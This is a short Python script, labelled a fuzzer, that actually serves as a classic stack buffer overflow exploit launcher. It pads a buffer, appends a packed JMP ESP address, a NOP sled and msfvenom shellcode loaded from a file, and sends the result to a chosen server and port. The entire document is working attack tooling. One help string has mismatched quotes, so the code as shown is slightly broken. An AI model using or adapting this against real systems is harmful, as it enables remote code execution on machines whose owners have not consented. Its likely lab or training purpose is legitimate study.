
import socket,sys,argparse,struct

# Command line arguments
parser = argparse.ArgumentParser(prog='PyFuzzer', usage='%(prog)s -s/--server <DOMAIN> -p/--port <PORT>', description='Fuzzing for finding vulnerable BoF vulnerabilities')
parser.add_argument('--server','-s',type=str,help='The host you want to connect with', action='store', required=True)
parser.add_argument('--port','-p',type=int,help='The port you want to connect to',action='store', required=True)
parser.add_argument('--data','-d',type=str,help='The payload that needs to prepend the buffer if applicable', action='store', default='', required=False)
parser.add_argument('--buffer', '-b', type=int,help='The size of the buffer', action='store', default=100, required=False)
parser.add_argument('--memaddr', '-m', type=str,help='Memory address for "JMP ESP"', action='store', required=False)
parser.add_argument('--nops', '-n', type=int, help="Number of NOPS to use for padding, default is 32', default=32, required=False)
parser.add_argument('--overflow','-o',type=str, help='Location of the file containing the exploit code to jump into', required=False)

args = parser.parse_args()

# output file from msfvenom, containing exploit code

overflow = open(args.overflow,'rb').read()[22:-2].replace(b'\n',b'')

shellcode = (b'\x41' * args.buffer) + (struct.pack('<L',int(args.memaddr,16))) + (b'\x90' * args.nops) + (overflow)
data = bytes(args.data,'latin-1')
payload = data + shellcode

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((args.server, args.port))
    s.send(payload)
    print(payload)
    s.close()

except:
   print("Can't connect to the server")
   sys.exit()
